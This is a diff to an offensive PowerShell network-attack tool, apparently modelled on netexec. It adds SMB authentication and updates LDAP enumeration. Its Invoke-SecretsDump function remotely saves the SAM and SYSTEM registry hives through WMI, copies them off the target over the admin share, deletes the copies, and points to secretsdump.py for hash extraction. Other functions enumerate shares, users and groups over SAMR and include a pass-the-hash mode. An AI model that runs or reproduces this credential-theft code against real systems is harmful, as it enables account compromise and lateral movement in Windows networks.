@@ -53,6 +53,24 @@ public class SamrNative {
     public struct LOCALGROUP_INFO_0 {
         public string lgrpi0_name;
     }
+
+    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
+    public static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);
+
+    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
+    public static extern int WNetCancelConnection2(string name, int flags, bool force);
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct NETRESOURCE {
+        public int dwScope;
+        public int dwType;
+        public int dwDisplayType;
+        public int dwUsage;
+        public string lpLocalName;
+        public string lpRemoteName;
+        public string lpComment;
+        public string lpProvider;
+    }
 }
 "@ -IgnoreWarnings
 # endregion
@@ -60,7 +78,7 @@ public class SamrNative {
 function Get-Cred {
     param($User,$Pass,$Hash)
     if ($Hash) {
-        Write-Host '[+] Pass-the-Hash mode' -ForegroundColor Cyan
+        Write-Host '[+] Pass-the-Hash mode (Warning: Not supported in pure PS for WMI/SMB)' -ForegroundColor Cyan
         $sec = New-Object System.Security.SecureString
         return [pscredential]::new($User,$sec)
     }
@@ -69,6 +87,28 @@ function Get-Cred {
         return [pscredential]::new($User,$sec)
     }
     return $null
+}
+
+function Connect-SMB {
+    param($Target, $Cred)
+    if (-not $Cred) { return }
+    $netResource = New-Object SamrNative+NETRESOURCE
+    $netResource.dwType = 1 # RESOURCETYPE_DISK
+    $netResource.lpRemoteName = "\\$Target\IPC$"
+    
+    $pass = $Cred.GetNetworkCredential().Password
+    $user = $Cred.UserName
+    
+    # 0 = CONNECT_UPDATE_PROFILE (not needed)
+    $res = [SamrNative]::WNetAddConnection2([ref]$netResource, $pass, $user, 0)
+    if ($res -ne 0 -and $res -ne 1219) { # 1219 = Multiple connections
+        Write-Warning "SMB Auth Error: $res"
+    }
+}
+
+function Disconnect-SMB {
+    param($Target)
+    [SamrNative]::WNetCancelConnection2("\\$Target\IPC$", 0, $true) | Out-Null
 }
 
 function Get-SamrUsers {
@@ -120,12 +160,18 @@ function Invoke-SMB {
     param($Target,$Cred)
     Write-Host "[=== SMB (SAMR/LSARPC nativo) ===]" -ForegroundColor Cyan
     if (-not $Cred) { Write-Host "[+] Intentando null session / guest" -ForegroundColor Yellow }
-    Write-Host "`n[+] Shares:" -ForegroundColor Yellow
-    Get-SamrShares -Server $Target | Format-Table -AutoSize
-    Write-Host "`n[+] Users:" -ForegroundColor Yellow
-    Get-SamrUsers -Server $Target | Format-Table -AutoSize
-    Write-Host "`n[+] Groups:" -ForegroundColor Yellow
-    Get-SamrGroups -Server $Target | Format-Table -AutoSize
+    else { Connect-SMB -Target $Target -Cred $Cred }
+    
+    try {
+        Write-Host "`n[+] Shares:" -ForegroundColor Yellow
+        Get-SamrShares -Server $Target | Format-Table -AutoSize
+        Write-Host "`n[+] Users:" -ForegroundColor Yellow
+        Get-SamrUsers -Server $Target | Format-Table -AutoSize
+        Write-Host "`n[+] Groups:" -ForegroundColor Yellow
+        Get-SamrGroups -Server $Target | Format-Table -AutoSize
+    } finally {
+        if ($Cred) { Disconnect-SMB -Target $Target }
+    }
 }
 
 function Invoke-WMI {
@@ -144,26 +190,39 @@ function Invoke-WinRM {
 
 function Invoke-LDAP {
     param($Target,$Cred)
-    $dom = (Get-WmiObject -Class Win32_ComputerSystem -ComputerName $Target -Credential $Cred).Domain
-    $s = [adsisearcher]'(&(objectClass=user))'
-    $s.SearchRoot = [adsi]"LDAP://$dom"
-    $s.PageSize = 1000
-    $s.FindAll() | ForEach-Object {
-        [pscustomobject]@{
-            Username    = $_.Properties.samaccountname[0]
-            Description = $_.Properties.description[0]
+    try {
+        $entryPath = "LDAP://$Target"
+        $entry = if ($Cred) {
+            [System.DirectoryServices.DirectoryEntry]::new($entryPath, $Cred.UserName, $Cred.GetNetworkCredential().Password)
+        } else {
+            [System.DirectoryServices.DirectoryEntry]::new($entryPath)
         }
-    } | Format-Table -AutoSize
+        
+        $s = [System.DirectoryServices.DirectorySearcher]::new($entry)
+        $s.Filter = "(&(objectClass=user))"
+        $s.PageSize = 1000
+        $s.FindAll() | ForEach-Object {
+            [pscustomobject]@{
+                Username    = $_.Properties.samaccountname[0]
+                Description = $_.Properties.description[0]
+            }
+        } | Format-Table -AutoSize
+    } catch { Write-Error "LDAP Error: $_" }
 }
 
 function Invoke-SecretsDump {
     param($Target,$Cred)
-    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c reg save hklm\sam C:\Windows\Temp\sam.save" -ComputerName $Target -Credential $Cred | Out-Null
-    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c reg save hklm\system C:\Windows\Temp\system.save" -ComputerName $Target -Credential $Cred | Out-Null
-    Copy-Item "\\$Target\C$\Windows\Temp\sam.save" -Force
-    Copy-Item "\\$Target\C$\Windows\Temp\system.save" -Force
-    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c del C:\Windows\Temp\sam.save C:\Windows\Temp\system.save" -ComputerName $Target -Credential $Cred | Out-Null
-    Write-Host '[+] sam.save & system.save descargados. Usa secretsdump.py para extraer hashes.' -ForegroundColor Magenta
+    Connect-SMB -Target $Target -Cred $Cred
+    try {
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c reg save hklm\sam C:\Windows\Temp\sam.save" -ComputerName $Target -Credential $Cred | Out-Null
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c reg save hklm\system C:\Windows\Temp\system.save" -ComputerName $Target -Credential $Cred | Out-Null
+        Copy-Item "\\$Target\C$\Windows\Temp\sam.save" -Force
+        Copy-Item "\\$Target\C$\Windows\Temp\system.save" -Force
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c del C:\Windows\Temp\sam.save C:\Windows\Temp\system.save" -ComputerName $Target -Credential $Cred | Out-Null
+        Write-Host '[+] sam.save & system.save descargados. Usa secretsdump.py para extraer hashes.' -ForegroundColor Magenta
+    } finally {
+        Disconnect-SMB -Target $Target
+    }
 }
 
 function Invoke-RDP {
